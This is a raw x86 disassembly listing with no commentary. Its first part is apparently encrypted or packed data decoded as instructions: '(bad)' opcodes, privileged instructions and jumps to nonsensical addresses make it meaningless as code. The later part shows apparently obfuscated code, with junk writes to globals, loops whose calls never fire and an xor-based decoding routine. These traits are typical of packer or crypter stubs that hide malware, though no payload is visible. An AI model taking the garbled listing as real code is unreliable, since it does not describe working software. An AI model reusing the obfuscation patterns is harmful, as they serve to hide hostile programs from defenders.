  40c657:	sar    ecx,1
  40c659:	pop    ss
  40c65a:	lock xchg cl,dh
  40c65d:	adc    ebp,edi
  40c65f:	cmp    BYTE PTR [eax-0x1e],ch
  40c662:	retf   0xf13
  40c665:	mov    dl,0xc7
  40c667:	mov    edx,ds
  40c669:	arpl   WORD PTR [ebx-0x62],sp
  40c66c:	scas   eax,DWORD PTR es:[edi]
  40c66d:	dec    edi
  40c66e:	(bad)  
  40c66f:	cmp    BYTE PTR [ebx],al
  40c671:	push   ebp
  40c672:	popf   
  40c673:	push   eax
  40c674:	repnz rcl ah,cl
  40c677:	retf   0x85d2
  40c67a:	repnz pop esi
  40c67c:	mov    ds:0xf95f0772,al
  40c681:	and    edi,DWORD PTR [ebx+0x544a3212]
  40c687:	mov    ebp,0xa2c08e2e
  40c68c:	jp     0x40c6c4
  40c68e:	mov    ch,0x60
  40c690:	jnp    0x40c62b
  40c692:	or     ebx,DWORD PTR [esi+eiz*1-0x7e5b0306]
  40c699:	sbb    al,bh
  40c69b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c69c:	mov    bl,BYTE PTR [ebp+ecx*1-0x4f6a7801]
  40c6a3:	xchg   esp,eax
  40c6a4:	xor    al,0x39
  40c6a6:	xchg   BYTE PTR [esp+esi*4+0x52ffd927],dl
  40c6ad:	add    al,dh
  40c6af:	pop    ds
  40c6b0:	pop    eax
  40c6b1:	mov    edi,0xf28e81e8
  40c6b6:	jmp    0x5cede4b1
  40c6bb:	sbb    ecx,edi
  40c6bd:	or     BYTE PTR [eax-0x1a1a9d5],al
  40c6c3:	sub    DWORD PTR [ecx+0x24e0f09a],edi
  40c6c9:	test   eax,0xe6e87542
  40c6ce:	push   cs
  40c6cf:	std    
  40c6d0:	aaa    
  40c6d1:	and    ah,ah
  40c6d3:	push   eax
  40c6d4:	mov    esp,0xc28ccb71
  40c6d9:	call   0x5d405f6f
  40c6de:	ret    0x6f0
  40c6e1:	jno    0x40c6d5
  40c6e3:	loop   0x40c75c
  40c6e5:	test   DWORD PTR [ecx+0x519cc260],ecx
  40c6eb:	mov    ah,0xb8
  40c6ed:	dec    eax
  40c6ee:	(bad)  
  40c6ef:	xchg   esi,eax
  40c6f0:	lock and dl,cl
  40c6f3:	leave  
  40c6f4:	and    DWORD PTR [ebx],0x229e2e8e
  40c6fa:	mov    bl,0xbe
  40c6fc:	add    eax,0xd095296e
  40c701:	aam    0xdd
  40c703:	and    bl,ah
  40c705:	cdq    
  40c706:	xor    esi,DWORD PTR [ebx]
  40c708:	dec    ebp
  40c709:	lock push 0x49f006c6
  40c70f:	mov    dl,0x73
  40c711:	pop    ds
  40c712:	jecxz  0x40c764
  40c714:	(bad)  
  40c715:	jnp    0x40c793
  40c717:	add    ah,BYTE PTR [eax]
  40c719:	mov    cl,BYTE PTR [ebx]
  40c71b:	test   al,0xfd
  40c71d:	fist   DWORD PTR [esi+0x6b]
  40c720:	stc    
  40c721:	inc    esp
  40c722:	xchg   ebp,eax
  40c723:	sbb    eax,0xe6699d72
  40c728:	mov    al,bl
  40c72a:	retf   0x2eff
  40c72d:	cmp    al,BYTE PTR [ebp+0x6a]
  40c730:	jb     0x40c72d
  40c732:	or     bl,BYTE PTR [eax]
  40c734:	add    eax,0xc32c3abd
  40c739:	jl     0x40c763
  40c73b:	into   
  40c73c:	xor    eax,0x6354a6eb
  40c741:	sbb    eax,0x49a8fa9a
  40c746:	xor    ebx,ecx
  40c748:	sbb    al,0xd1
  40c74a:	in     eax,dx
  40c74b:	xchg   DWORD PTR [edx],ebx
  40c74d:	inc    ecx
  40c74e:	retf   0xf7f8
  40c751:	stos   BYTE PTR es:[edi],al
  40c752:	mov    eax,0x74b87286
  40c757:	and    eax,0xb8530132
  40c75c:	leave  
  40c75d:	add    al,dh
  40c75f:	data16 add ah,BYTE PTR [edx]
  40c762:	gs pop ecx
  40c764:	pop    ebp
  40c765:	adc    esi,ebx
  40c767:	ss cli 
  40c769:	stc    
  40c76a:	push   ebx
  40c76b:	mov    edx,0x8508b946
  40c770:	rol    BYTE PTR [eax-0xda86853],0x27
  40c777:	arpl   WORD PTR [ebp+edx*2+0x4849c5d],si
  40c77e:	pop    es
  40c77f:	fcmovu st,st(2)
  40c781:	and    al,0x3b
  40c783:	jbe    0x40c79e
  40c785:	push   esi
  40c786:	push   cs
  40c787:	fwait
  40c788:	mov    ecx,0x2e2e80bc
  40c78d:	push   es
  40c78e:	dec    esi
  40c78f:	mov    ss,esi
  40c791:	jo     0x40c783
  40c793:	div    BYTE PTR [ebx+0x2e10694a]
  40c799:	lods   al,BYTE PTR ds:[esi]
  40c79a:	arpl   WORD PTR [ebx],sp
  40c79c:	pop    ebx
  40c79d:	sbb    ch,dh
  40c79f:	jae    0x40c81b
  40c7a1:	and    ebx,eax
  40c7a3:	push   ecx
  40c7a4:	jmp    0x40c789
  40c7a6:	pop    esp
  40c7a7:	mov    ch,0xb6
  40c7a9:	add    bl,BYTE PTR [ebx+0x69]
  40c7ac:	adc    al,0x6d
  40c7ae:	mov    ah,BYTE PTR [ebx+0x23]
  40c7b1:	adc    al,0xa2
  40c7b3:	call   0xe2eb:0xff965f7e
  40c7ba:	hlt    
  40c7bb:	xchg   ebp,eax
  40c7bc:	std    
  40c7bd:	ja     0x40c7e3
  40c7bf:	cmp    bl,BYTE PTR [ebx+esi*1-0x7a]
  40c7c3:	mov    esi,0x6deb4d41
  40c7c8:	push   es
  40c7c9:	adc    eax,0xe650e36c
  40c7ce:	hlt    
  40c7cf:	push   ds
  40c7d0:	pop    ds
  40c7d1:	xor    eax,0x262b6b25
  40c7d6:	xor    al,0xf9
  40c7d8:	das    
  40c7d9:	std    
  40c7da:	fptan  
  40c7dc:	pop    ds
  40c7dd:	inc    eax
  40c7de:	jns    0x40c837
  40c7e0:	xchg   ecx,eax
  40c7e1:	es push ebp
  40c7e3:	test   DWORD PTR ss:[ebx+eax*2-0x2268f110],ebx
  40c7eb:	add    esi,DWORD PTR [ebp-0x6712c6a1]
  40c7f1:	cld    
  40c7f2:	repz adc eax,0x69205437
  40c7f8:	aaa    
  40c7f9:	mov    al,0x72
  40c7fb:	dec    esp
  40c7fc:	mov    dh,0x95
  40c7fe:	sub    cl,bl
  40c800:	jbe    0x40c7d8
  40c802:	jae    0x40c842
  40c804:	sub    DWORD PTR [edx-0x60],esp
  40c807:	cmp    BYTE PTR [esi+edi*2],dl
  40c80a:	dec    ecx
  40c80b:	fcom   QWORD PTR [esp+ecx*2]
  40c80e:	aad    0xb4
  40c810:	mov    ebp,ebx
  40c812:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c813:	(bad)  
  40c814:	pop    ds
  40c815:	sbb    eax,0xe9d792e8
  40c81a:	pushf  
  40c81b:	mov    WORD PTR [eax+0x2b],ds
  40c81e:	mov    ah,0xf2
  40c820:	arpl   WORD PTR [esi+0x61e5eda1],cx
  40c826:	push   esi
  40c827:	jno    0x40c809
  40c829:	xor    ecx,ecx
  40c82b:	sub    bh,ch
  40c82d:	pop    ds
  40c82e:	fs aas 
  40c830:	push   ebp
  40c831:	pop    ss
  40c832:	aaa    
  40c833:	imul   ebp,DWORD PTR [eax+0x36],0x6aa734eb
  40c83a:	sahf   
  40c83b:	pop    esi
  40c83c:	test   BYTE PTR [esi-0x3facc00a],bh
  40c842:	cmp    ah,0xd
  40c845:	jb     0x40c875
  40c847:	daa    
  40c848:	mov    ds,esi
  40c84a:	dec    esi
  40c84b:	cwde   
  40c84c:	ds icebp 
  40c84e:	aas    
  40c84f:	jge    0x40c880
  40c851:	xor    al,cl
  40c853:	mov    eax,ds:0xe0f3d4
  40c858:	cmp    al,0xe3
  40c85a:	cmp    al,0x3e
  40c85c:	pusha  
  40c85d:	retf   0x479a
  40c860:	cmc    
  40c861:	mov    ss,eax
  40c863:	adc    edi,DWORD PTR [ebp-0x30]
  40c866:	mov    ah,BYTE PTR [edi+0x7c]
  40c869:	das    
  40c86a:	leave  
  40c86b:	out    dx,eax
  40c86c:	outs   dx,BYTE PTR ds:[esi]
  40c86d:	outs   dx,BYTE PTR ds:[esi]
  40c86e:	cwde   
  40c86f:	sbb    DWORD PTR ds:0x49f7de8e,0x401303a4
  40c879:	sub    DWORD PTR [ebp+0x15],ebp
  40c87c:	arpl   WORD PTR [eax],dx
  40c87e:	pusha  
  40c87f:	enterw 0x43e2,0x28
  40c884:	pop    ss
  40c885:	outs   dx,DWORD PTR ds:[esi]
  40c886:	iret   
  40c887:	pop    edx
  40c888:	push   esi
  40c889:	add    al,0xd6
  40c88b:	imul   ebp,DWORD PTR [eax+esi*8],0x8
  40c88f:	jo     0x40c84c
  40c891:	cli    
  40c892:	cdq    
  40c893:	jp     0x40c88c
  40c895:	jp     0x40c90b
  40c897:	pop    esi
  40c898:	movaps xmm1,xmm6
  40c89b:	repnz push 0x86e29054
  40c8a1:	or     ah,dh
  40c8a3:	inc    eax
  40c8a4:	jmp    0x4417ada5
  40c8a9:	ficomp WORD PTR [ebx+0x7d]
  40c8ac:	mov    gs,WORD PTR ds:0x5ccaafa8
  40c8b2:	mov    BYTE PTR [ecx],0x45
  40c8b5:	xchg   esp,eax
  40c8b6:	ret    0x3203
  40c8b9:	xchg   ebx,eax
  40c8ba:	ja     0x40c8b7
  40c8bc:	cdq    
  40c8bd:	push   eax
  40c8be:	in     eax,0x90
  40c8c0:	retf   
  40c8c1:	and    ebp,DWORD PTR [ebx+0x6abd8160]
  40c8c7:	add    DWORD PTR [edi+ecx*1],edi
  40c8ca:	(bad)  
  40c8cb:	pop    eax
  40c8cc:	out    dx,al
  40c8cd:	dec    ebp
  40c8ce:	pop    eax
  40c8cf:	ins    BYTE PTR es:[edi],dx
  40c8d0:	mov    eax,ds:0xa41fce78
  40c8d5:	sub    BYTE PTR [ecx+0x7],al
  40c8d8:	xor    BYTE PTR [ebx+0x3e],bl
  40c8db:	sahf   
  40c8dc:	(bad)  
  40c8de:	dec    ecx
  40c8df:	pop    eax
  40c8e0:	shr    BYTE PTR es:[ebx+esi*2-0x5476e1ae],cl
  40c8e8:	xor    BYTE PTR [edi+ecx*2+0x3bbc9a03],dh
  40c8ef:	mov    bl,0x7c
  40c8f1:	jne    0x40c93d
  40c8f3:	adc    BYTE PTR [ecx],bh
  40c8f5:	leave  
  40c8f6:	or     dh,ah
  40c8f8:	cs sub bl,ah
  40c8fb:	lock scas eax,DWORD PTR es:[edi]
  40c8fd:	cmp    edx,DWORD PTR [ebx-0x19]
  40c900:	(bad)  
  40c901:	popa   
  40c902:	dec    esi
  40c903:	cwde   
  40c904:	xlat   BYTE PTR ss:[ebx]
  40c906:	popa   
  40c907:	lods   eax,DWORD PTR ds:[esi]
  40c908:	xchg   BYTE PTR [edx-0x50416468],dl
  40c90e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c90f:	fcom   QWORD PTR [ebx-0xd03c85e]
  40c915:	pop    ebx
  40c916:	dec    ecx
  40c917:	sub    DWORD PTR [ebp+0x48b68eee],ebx
  40c91d:	push   ds
  40c91e:	imul   ebx,ebp,0x74
  40c921:	cmp    eax,0x685526a0
  40c926:	cs xor eax,0xec3c0076
  40c92c:	sub    BYTE PTR [ebp+0x2d],0x48
  40c930:	and    BYTE PTR [edi],bl
  40c932:	shr    DWORD PTR [esi+0x47],0x8d
  40c936:	dec    eax
  40c937:	loop   0x40c9b2
  40c939:	mov    ebp,DWORD PTR [eax+edx*2+0x2a34d139]
  40c940:	stos   BYTE PTR es:[edi],al
  40c941:	cmp    DWORD PTR [edi+ebx*1+0x79],ebx
  40c945:	ret    
  40c946:	mov    edi,0xf390e2bb
  40c94b:	hlt    
  40c94c:	add    al,0xe0
  40c94e:	mov    al,ds:0xa07e5a13
  40c953:	or     edi,ebp
  40c955:	cwde   
  40c956:	neg    DWORD PTR [ebx+0x15]
  40c959:	call   0xca698c64
  40c95e:	inc    bh
  40c960:	inc    ebp
  40c961:	clc    
  40c962:	mov    cl,0x85
  40c964:	pushf  
  40c965:	clc    
  40c966:	xor    DWORD PTR ds:0x413d34,0x2984
  40c970:	mov    ecx,DWORD PTR [ebp-0x14]
  40c973:	and    DWORD PTR ds:0x413d24,0x0
  40c97d:	jmp    0x40c990
  40c982:	xor    eax,eax
  40c984:	or     eax,DWORD PTR ds:0x413d24
  40c98a:	inc    eax
  40c98b:	mov    ds:0x413d24,eax
  40c990:	cmp    DWORD PTR ds:0x413d24,0x18
  40c997:	jae    0x40ca0e
  40c99d:	cmp    DWORD PTR ds:0x413d24,0x20
  40c9a4:	jne    0x40c9bd
  40c9aa:	push   0x738d
  40c9af:	push   0x6edb
  40c9b4:	push   DWORD PTR [ebp-0x18]
  40c9b7:	call   DWORD PTR ds:0x416768
  40c9bd:	jmp    0x40c982
  40c9c2:	mov    DWORD PTR ds:0x413c1e,0x1e
  40c9cc:	cmp    DWORD PTR ds:0x413c1e,0x0
  40c9d3:	je     0x40ca0e
  40c9d9:	cmp    DWORD PTR ds:0x413c1e,0x2c
  40c9e0:	jne    0x40c9fe
  40c9e6:	push   0x25a0
  40c9eb:	push   0x413ce4
  40c9f0:	push   0x3cd5
  40c9f5:	push   DWORD PTR [ebp-0x18]
  40c9f8:	call   DWORD PTR ds:0x416770
  40c9fe:	mov    eax,ds:0x413c1e
  40ca03:	dec    eax
  40ca04:	mov    ds:0x413c1e,eax
  40ca09:	jmp    0x40c9cc
  40ca0e:	push   esi
  40ca0f:	sbb    DWORD PTR ds:0x413ce4,0x7973
  40ca19:	mov    eax,0x7510894
  40ca1e:	and    DWORD PTR ds:0x413c1e,0x0
  40ca28:	jmp    0x40ca3a
  40ca2d:	mov    esi,DWORD PTR ds:0x413c1e
  40ca33:	inc    esi
  40ca34:	mov    DWORD PTR ds:0x413c1e,esi
  40ca3a:	cmp    DWORD PTR ds:0x413c1e,0x15
  40ca41:	jae    0x40ca74
  40ca47:	cmp    DWORD PTR ds:0x413c1e,0x1f
  40ca4e:	jne    0x40ca6e
  40ca54:	push   0x413c12
  40ca59:	push   0x88a1
  40ca5e:	push   0x416000
  40ca63:	push   0x416152
  40ca68:	call   DWORD PTR ds:0x416774
  40ca6e:	jmp    0x40ca2d
  40ca73:	inc    esi
  40ca74:	xor    ecx,eax
  40ca76:	sub    esi,DWORD PTR ds:0x413c70
  40ca7c:	mov    esi,0x3272dc
  40ca81:	mov    DWORD PTR ds:0x413c80,0x12bb
  40ca8b:	push   edi
  40ca8c:	xor    DWORD PTR ds:0x413ce4,0x413c6c
  40ca96:	add    ecx,esi
  40ca98:	jmp    0x40cab4
  40ca9d:	mov    dl,BYTE PTR [ebp-0x1]
  40caa0:	not    DWORD PTR ds:0x41400c
  40caa6:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40caad:	not    DWORD PTR ds:0x413ce8
  40cab3:	inc    ecx
  40cab4:	cmp    ecx,0x40
  40cab7:	mov    DWORD PTR ds:0x413d24,0x3f58
  40cac1:	jb     0x40ca9d
  40cac7:	adc    edx,0x503d
  40cacd:	mov    edx,DWORD PTR [ebp-0x14]
  40cad0:	xor    edx,eax
  40cad2:	add    edx,esi
  40cad4:	jmp    0x40cc01
  40cad9:	and    DWORD PTR ds:0x413c0a,0x1a66
  40cae3:	mov    edi,DWORD PTR [ebp+0x8]
  40cae6:	and    ecx,0xcf4
  40caec:	mov    ecx,0x8a87
  40caf1:	adc    DWORD PTR ds:0x413c12,0x413d
  40cafb:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40cb00:	and    DWORD PTR ds:0x41401c,0x0
  40cb0a:	mov    edi,DWORD PTR ds:0x41401c
  40cb10:	inc    edi
  40cb11:	mov    DWORD PTR ds:0x41401c,edi
  40cb17:	cmp    DWORD PTR ds:0x41401c,0x5
  40cb1e:	jne    0x40cb39
  40cb24:	push   0x6acf
  40cb29:	push   0x413cf4
  40cb2e:	push   0x416152
  40cb33:	call   DWORD PTR ds:0x416778
  40cb39:	cmp    DWORD PTR ds:0x41401c,0x4
  40cb40:	jne    0x40cb53
  40cb46:	mov    edi,DWORD PTR ds:0x41401c
  40cb4c:	inc    edi
  40cb4d:	mov    DWORD PTR ds:0x41401c,edi
  40cb53:	cmp    DWORD PTR ds:0x41401c,0x1b
  40cb5a:	jb     0x40cb0a
  40cb60:	mov    DWORD PTR ds:0x414018,0x15
  40cb6a:	cmp    DWORD PTR ds:0x414018,0x0
  40cb71:	je     0x40cbab
  40cb77:	cmp    DWORD PTR ds:0x414018,0x1b
  40cb7e:	jne    0x40cb8f
  40cb84:	push   0x4160b3
  40cb89:	call   DWORD PTR ds:0x41677c
  40cb8f:	mov    edi,DWORD PTR ds:0x414018
  40cb95:	dec    edi
  40cb96:	mov    DWORD PTR ds:0x414018,edi
  40cb9c:	jmp    0x40cb6a
  40cba1:	xor    DWORD PTR ds:0x414008,0x3196
  40cbab:	mov    edi,0x3b4a
  40cbb0:	add    cx,di
  40cbb3:	sbb    DWORD PTR ds:0x414000,0x24d3
  40cbbd:	movzx  ecx,cx
  40cbc0:	xor    DWORD PTR ds:0x413bfe,0x413c06
  40cbca:	mov    DWORD PTR [ebp-0x10],ecx
  40cbcd:	neg    DWORD PTR ds:0x413c0e
  40cbd3:	mov    ecx,DWORD PTR [ebp+0x8]
  40cbd6:	or     DWORD PTR ds:0x413d20,0x3470
  40cbe0:	movzx  ecx,WORD PTR [ecx+edx*4]
  40cbe4:	xor    DWORD PTR ds:0x413d30,0x413bf6
  40cbee:	xor    ecx,0x8a87
  40cbf4:	add    ecx,edi
  40cbf6:	mov    edi,DWORD PTR [ebp-0x10]
  40cbf9:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  40cc00:	inc    edx
  40cc01:	mov    ecx,DWORD PTR [ebp-0x18]
  40cc04:	cmp    edx,ecx
  40cc06:	mov    DWORD PTR ds:0x414010,0x5811
  40cc10:	jne    0x40cad9
  40cc16:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc19:	mov    DWORD PTR ds:0x413d1c,0x410a
  40cc23:	mov    edx,DWORD PTR [ebp+0x10]
  40cc26:	dec    DWORD PTR ds:0x413cec
  40cc2c:	xor    ecx,eax
  40cc2e:	add    ecx,esi
  40cc30:	and    DWORD PTR ds:0x413c0a,0x5ecf
  40cc3a:	mov    DWORD PTR [edx],ecx
  40cc3c:	dec    ecx
  40cc3d:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc40:	xor    ecx,eax
  40cc42:	and    DWORD PTR ds:0x413bf6,0x413c84
  40cc4c:	add    ecx,esi
  40cc4e:	mov    DWORD PTR ds:0x413c0a,0x45cc
  40cc58:	mov    DWORD PTR [ebp-0x20],ecx
  40cc5b:	not    ecx
  40cc5d:	mov    DWORD PTR [ebp+0x8],0xf89c85b0
  40cc64:	mov    DWORD PTR [ebp-0xc],0xf89c85a0
  40cc6b:	mov    DWORD PTR [ebp-0x1c],0xf89c95b0
  40cc72:	mov    DWORD PTR ds:0x413c6c,edi
  40cc78:	mov    ecx,DWORD PTR [ebp-0xc]
  40cc7b:	mov    DWORD PTR ds:0x413c84,0x129c
  40cc85:	mov    DWORD PTR [ebp+0x8],ecx
  40cc88:	jmp    0x40ce75
  40cc8d:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc90:	add    edx,DWORD PTR ds:0x413c80
  40cc96:	mov    edx,DWORD PTR [ebp-0x8]
  40cc99:	and    DWORD PTR ds:0x413c74,0x413d20
  40cca3:	xor    ecx,eax
  40cca5:	xor    edx,eax
  40cca7:	sub    ecx,edx
  40cca9:	sub    ecx,esi
  40ccab:	xor    ecx,eax
  40ccad:	and    DWORD PTR ds:0x413c1a,0x0
  40ccb7:	mov    edx,DWORD PTR ds:0x413c1a
  40ccbd:	inc    edx
  40ccbe:	mov    DWORD PTR ds:0x413c1a,edx
  40ccc4:	cmp    DWORD PTR ds:0x413c1a,0x9
  40cccb:	jne    0x40cce4
  40ccd1:	push   0x413bfe
  40ccd6:	push   DWORD PTR [ebp-0x20]
  40ccd9:	push   0x4160ed
  40ccde:	call   DWORD PTR ds:0x416780
  40cce4:	cmp    DWORD PTR ds:0x413c1a,0x8
  40cceb:	jne    0x40ccfe
  40ccf1:	mov    edx,DWORD PTR ds:0x413c1a
  40ccf7:	inc    edx
  40ccf8:	mov    DWORD PTR ds:0x413c1a,edx
  40ccfe:	cmp    DWORD PTR ds:0x413c1a,0x10
  40cd05:	jb     0x40ccb7
  40cd0b:	mov    DWORD PTR [ebp+0x8],ecx
  40cd0e:	adc    ecx,ecx
  40cd10:	mov    ecx,DWORD PTR [ebp+0x8]
  40cd13:	mov    DWORD PTR ds:0x413c16,0x3405
  40cd1d:	mov    edx,DWORD PTR [ebp-0x64]
  40cd20:	lea    ecx,[edx+ecx*1+0x5708f1]
  40cd27:	mov    DWORD PTR [ebp-0x64],ecx
  40cd2a:	mov    ecx,DWORD PTR [ebp+0x8]
  40cd2d:	mov    edx,DWORD PTR [ebp-0x60]
  40cd30:	lea    ecx,[edx+ecx*1+0x5708f1]
  40cd37:	movzx  edx,WORD PTR ds:0x413d20
  40cd3e:	sbb    edx,DWORD PTR ds:0x413d28
  40cd44:	mov    DWORD PTR ds:0x413d20,edx
  40cd4a:	mov    DWORD PTR [ebp-0x60],ecx
  40cd4d:	and    DWORD PTR ds:0x414000,0x413d1c
  40cd57:	mov    ecx,DWORD PTR [ebp+0x8]
  40cd5a:	add    DWORD PTR ds:0x413c78,ebx
  40cd60:	mov    edx,DWORD PTR [ebp-0x5c]
  40cd63:	neg    DWORD PTR ds:0x413c02
  40cd69:	lea    ecx,[edx+ecx*1+0x5708f2]
  40cd70:	and    DWORD PTR ds:0x413d20,0x0
  40cd7a:	mov    edx,DWORD PTR ds:0x413d20
  40cd80:	inc    edx
  40cd81:	mov    DWORD PTR ds:0x413d20,edx
  40cd87:	cmp    DWORD PTR ds:0x413d20,0xa
  40cd8e:	jne    0x40cda2
  40cd94:	push   0x413d34
  40cd99:	push   DWORD PTR [ebp-0x24]
  40cd9c:	call   DWORD PTR ds:0x416784
  40cda2:	cmp    DWORD PTR ds:0x413d20,0x9
  40cda9:	jne    0x40cdbe
  40cdaf:	xor    edx,edx
  40cdb1:	add    edx,DWORD PTR ds:0x413d20
  40cdb7:	inc    edx
  40cdb8:	mov    DWORD PTR ds:0x413d20,edx
  40cdbe:	cmp    DWORD PTR ds:0x413d20,0x15
  40cdc5:	jb     0x40cd7a
  40cdcb:	or     DWORD PTR ds:0x413ce8,0x2ce1
  40cdd5:	mov    DWORD PTR [ebp-0x5c],ecx
  40cdd8:	mov    ecx,DWORD PTR [ebp+0x8]
  40cddb:	add    DWORD PTR ds:0x413c1e,ecx
  40cde1:	mov    edx,DWORD PTR [ebp-0x58]
  40cde4:	lea    ecx,[edx+ecx*1+0x5708f3]
  40cdeb:	add    DWORD PTR ds:0x413bfe,ebx
  40cdf1:	mov    DWORD PTR [ebp-0x58],ecx
  40cdf4:	mov    ecx,DWORD PTR [ebp+0x8]
  40cdf7:	or     DWORD PTR ds:0x413c80,0x1524
  40ce01:	mov    edx,DWORD PTR [ebp-0x54]
  40ce04:	lea    ecx,[edx+ecx*1+0x5708fc]
  40ce0b:	adc    edx,DWORD PTR ds:0x41400c
  40ce11:	mov    DWORD PTR [ebp-0x54],ecx
  40ce14:	and    DWORD PTR ds:0x413d20,0x0
  40ce1e:	mov    edx,DWORD PTR ds:0x413d20
  40ce24:	inc    edx
  40ce25:	mov    DWORD PTR ds:0x413d20,edx
  40ce2b:	cmp    DWORD PTR ds:0x413d20,0x12
  40ce32:	jne    0x40ce48
  40ce38:	push   0x8060
  40ce3d:	push   0x41608d
  40ce42:	call   DWORD PTR ds:0x41678c
  40ce48:	cmp    DWORD PTR ds:0x413d20,0x10
  40ce4f:	jb     0x40ce1e
  40ce55:	mov    ecx,DWORD PTR [ebp+0x8]
  40ce58:	sbb    edx,DWORD PTR ds:0x413c0e
  40ce5e:	mov    edx,DWORD PTR [ebp-0x50]
  40ce61:	sbb    DWORD PTR ds:0x413cf4,0x413c16
  40ce6b:	lea    ecx,[edx+ecx*1+0x5708fd]
  40ce72:	mov    DWORD PTR [ebp-0x50],ecx
  40ce75:	and    DWORD PTR ds:0x413c12,0x0
  40ce7f:	mov    ecx,DWORD PTR ds:0x413c12
  40ce85:	inc    ecx
  40ce86:	mov    DWORD PTR ds:0x413c12,ecx
  40ce8c:	cmp    DWORD PTR ds:0x413c12,0x1d
  40ce93:	jne    0x40ceb7
  40ce99:	push   DWORD PTR [ebp-0x20]
  40ce9c:	push   0x413c70
  40cea1:	push   0x4dec
  40cea6:	push   0x4160bf
  40ceab:	push   DWORD PTR [ebp-0x20]
  40ceae:	push   DWORD PTR [ebp-0x10]
  40ceb1:	call   DWORD PTR ds:0x416790
  40ceb7:	cmp    DWORD PTR ds:0x413c12,0x11
  40cebe:	jb     0x40ce7f
  40cec4:	mov    ecx,DWORD PTR [ebp+0x8]
  40cec7:	xor    ecx,eax
  40cec9:	add    ecx,esi
  40cecb:	jne    0x40cc8d
  40ced1:	jmp    0x40f43d
  40ced6:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ced9:	mov    edx,DWORD PTR [ebp-0x8]
  40cedc:	xor    ecx,eax
  40cede:	xor    edx,eax
  40cee0:	sub    ecx,edx
  40cee2:	sub    ecx,esi
  40cee4:	xor    ecx,eax
  40cee6:	mov    DWORD PTR [ebp-0x1c],ecx
  40cee9:	mov    ecx,DWORD PTR [ebp-0xc]
  40ceec:	mov    DWORD PTR [ebp+0x8],ecx
  40ceef:	jmp    0x40cf21
  40cef4:	mov    ecx,DWORD PTR [ebp+0x8]
  40cef7:	mov    edx,DWORD PTR [ebp-0x8]
  40cefa:	xor    ecx,eax
  40cefc:	xor    edx,eax
  40cefe:	sub    ecx,edx
  40cf00:	sub    ecx,esi
  40cf02:	xor    ecx,eax
  40cf04:	mov    DWORD PTR [ebp+0x8],ecx
  40cf07:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf0a:	mov    edx,DWORD PTR [ebp+0x8]
  40cf0d:	imul   edx,edx,0x5708f1
  40cf13:	xor    ecx,eax
  40cf15:	add    ecx,esi
  40cf17:	lea    ecx,[ebp+ecx*4-0x64]
  40cf1b:	mov    edi,DWORD PTR [ecx]
  40cf1d:	add    edx,edi
  40cf1f:	mov    DWORD PTR [ecx],edx
  40cf21:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf24:	xor    ecx,eax
  40cf26:	add    ecx,esi
  40cf28:	jne    0x40cef4
  40cf2e:	mov    ecx,DWORD PTR [ebp-0x20]
  40cf31:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40cf38:	mov    dl,BYTE PTR [ebp-0x1]
  40cf3b:	cmp    cl,dl
  40cf3d:	je     0x40f39e
  40cf43:	mov    ecx,DWORD PTR [ebp-0x20]
  40cf46:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40cf4d:	mov    edx,DWORD PTR [ebp+0xc]
  40cf50:	cmp    cl,BYTE PTR [edx]
  40cf52:	jne    0x40f44f
  40cf58:	mov    ecx,DWORD PTR [ebp-0x14]
  40cf5b:	mov    edx,DWORD PTR [ebp+0xc]
  40cf5e:	movsx  edx,BYTE PTR [edx]
  40cf61:	xor    ecx,eax
  40cf63:	add    ecx,esi
  40cf65:	cmp    edx,ecx
  40cf67:	mov    ecx,DWORD PTR [ebp-0xc]
  40cf6a:	mov    DWORD PTR [ebp+0x8],ecx
  40cf6d:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf70:	je     0x411851
  40cf76:	jmp    0x40cfab
  40cf7b:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf7e:	mov    edx,DWORD PTR [ebp-0x8]
  40cf81:	xor    ecx,eax
  40cf83:	xor    edx,eax
  40cf85:	sub    ecx,edx
  40cf87:	sub    ecx,esi
  40cf89:	xor    ecx,eax
  40cf8b:	mov    DWORD PTR [ebp+0x8],ecx
  40cf8e:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf91:	mov    edx,DWORD PTR [ebp+0x8]
  40cf94:	xor    ecx,eax
  40cf96:	imul   edx,edx,0x5708f1
  40cf9c:	add    ecx,esi
  40cf9e:	lea    ecx,[ebp+ecx*4-0x64]
  40cfa2:	mov    edi,DWORD PTR [ecx]
  40cfa4:	add    edx,edi
  40cfa6:	mov    DWORD PTR [ecx],edx
  40cfa8:	mov    ecx,DWORD PTR [ebp+0x8]
  40cfab:	xor    ecx,eax
  40cfad:	add    ecx,esi
  40cfaf:	jne    0x40cf7b
  40cfb5:	mov    ecx,DWORD PTR [ebp-0x14]
  40cfb8:	mov    edx,DWORD PTR [ebp+0x8]
  40cfbb:	xor    ecx,eax
  40cfbd:	xor    edx,eax
  40cfbf:	add    ecx,esi
  40cfc1:	add    edx,esi
  40cfc3:	cmp    ecx,edx
  40cfc5:	jae    0x40f3e3
  40cfcb:	lea    edx,[ecx-0x3272dc]
  40cfd1:	mov    DWORD PTR [ebp-0x18],edx
  40cfd4:	mov    edi,DWORD PTR [ebp-0x18]
  40cfd7:	mov    DWORD PTR [ebp-0x24],0x705fd0e
  40cfde:	lea    edx,[ebp-0x24]
  40cfe1:	mov    DWORD PTR [ebp-0x10],edx
  40cfe4:	mov    edx,DWORD PTR [ebp-0x10]
  40cfe7:	add    DWORD PTR [edx],0x705fa0e
  40cfed:	mov    ebx,DWORD PTR [ebp-0x10]
  40cff0:	xor    edi,eax
  40cff2:	add    edi,DWORD PTR [ebx]
  40cff4:	lea    edx,[ebp+ecx*4-0x64]
  40cff8:	jmp    0x40f380
  40cffd:	sar    BYTE PTR [ebx-0x74043cf0],1
  40d003:	jae    0x40cfc0
  40d005:	dec    ebp
